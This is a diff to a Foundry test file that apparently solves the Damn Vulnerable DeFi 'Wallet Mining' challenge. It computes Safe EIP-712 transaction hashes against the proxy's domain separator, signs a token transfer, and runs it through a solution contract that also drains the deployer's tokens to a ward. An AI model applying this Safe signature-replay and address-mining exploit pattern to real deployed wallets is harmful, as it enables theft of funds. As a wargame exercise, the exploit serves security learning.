@@ -28,6 +28,9 @@ contract WalletMiningChallenge is Test {
     address constant SAFE_SINGLETON_FACTORY_ADDRESS = 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
     bytes constant SAFE_SINGLETON_FACTORY_CODE =
         hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3";
+    
+    bytes32 private constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
+    bytes32 private constant SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;
 
     DamnValuableToken token;
     AuthorizerUpgradeable authorizer;
@@ -127,29 +130,98 @@ contract WalletMiningChallenge is Test {
     function test_walletMining() public checkSolvedByPlayer {
         uint256 nonce = getNonce();
         bytes memory initializer = getInitializer();
-
         bytes memory signatures = getSig();
         new WalletMiningSolution(walletDeployer, authorizer, nonce, initializer, token, ward, initialWalletDeployerTokenBalance, user, signatures);
     }
 
     function getSig() internal view returns (bytes memory signatures) {
-        bytes32 txHash = singletonCopy.getTransactionHash(
-            address(token), // to
-            0, // value
-            abi.encodeCall(
-                ERC20.transfer,
-                (user, DEPOSIT_TOKEN_AMOUNT)
-            ), // calldata
-            Enum.Operation(0), // operation: 0 for call, 1 for delegatecall
-            0, 0, 0, address(0), address(0),
-            0
+        address to = address(token);
+        uint256 value = 0;
+        bytes memory data = abi.encodeCall(ERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+        Enum.Operation operation = Enum.Operation(0); // operation: 0 for call, 1 for delegatecall
+        uint256 safeTxGas = 0;
+        uint256 baseGas = 0;
+        uint256 gasPrice = 0;
+        address gasToken = address(0);
+        address refundReceiver = address(0);
+        uint256 _nonce = 0;
+        // we should not use `singletonCopy.getTransactionHash` since the domain separator is different (different contract address)
+        bytes32 txHash = getTransactionHash(
+            to,
+            value,
+            data,
+            operation, 
+            safeTxGas,
+            baseGas,
+            gasPrice,
+            gasToken,
+            refundReceiver,
+            _nonce
         );
         // sign the transaction
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
         signatures = abi.encodePacked(r, s, v);
     }
 
-    function getNonce() internal returns (uint256 nonce) {
+    function getTransactionHash(
+        address to,
+        uint256 value,
+        bytes memory data,
+        Enum.Operation operation,
+        uint256 safeTxGas,
+        uint256 baseGas,
+        uint256 gasPrice,
+        address gasToken,
+        address refundReceiver,
+        uint256 _nonce
+    ) public view returns (bytes32) {
+        return keccak256(encodeTransactionData(to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, _nonce));
+    }
+
+    function encodeTransactionData(
+        address to,
+        uint256 value,
+        bytes memory data,
+        Enum.Operation operation,
+        uint256 safeTxGas,
+        uint256 baseGas,
+        uint256 gasPrice,
+        address gasToken,
+        address refundReceiver,
+        uint256 _nonce
+    ) public view returns (bytes memory) {
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                SAFE_TX_TYPEHASH,
+                to,
+                value,
+                keccak256(data),
+                operation,
+                safeTxGas,
+                baseGas,
+                gasPrice,
+                gasToken,
+                refundReceiver,
+                _nonce
+            )
+        );
+        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);
+    }
+
+    function domainSeparator() public view returns (bytes32) {
+        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), address(USER_DEPOSIT_ADDRESS)));
+    }
+
+    function getChainId() public view returns (uint256) {
+        uint256 id;
+        // solhint-disable-next-line no-inline-assembly
+        assembly {
+            id := chainid()
+        }
+        return id;
+    }
+
+    function getNonce() internal view returns (uint256 nonce) {
         for (; nonce < 100; nonce++) {
             address addr = getAddressFromNonce(nonce);
             if (addr == USER_DEPOSIT_ADDRESS) return nonce;
@@ -165,7 +237,7 @@ contract WalletMiningChallenge is Test {
         );
     }
 
-    function getAddressFromNonce(uint256 saltNonce) internal returns (address addr) {
+    function getAddressFromNonce(uint256 saltNonce) internal view returns (address addr) {
         bytes memory initializer = getInitializer();
         address singleton = address(singletonCopy);
         bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(singleton)));
@@ -220,17 +292,16 @@ contract WalletMiningSolution {
         safe.execTransaction(
             address(token), // to
             0, // value
-            abi.encodeCall(
-                ERC20.transfer,
-                (user, DEPOSIT_TOKEN_AMOUNT)
-            ), // calldata
+            abi.encodeCall(ERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT)), // calldata
             Enum.Operation(0), // operation: 0 for call, 1 for delegatecall
-            0, 0, 0, address(0), payable(0), 
+            0, 
+            0, 
+            0, 
+            address(0), 
+            payable(0), 
             signatures
         );
 
-
         token.transfer(ward, initialWalletDeployerTokenBalance);
-        
     }
 }
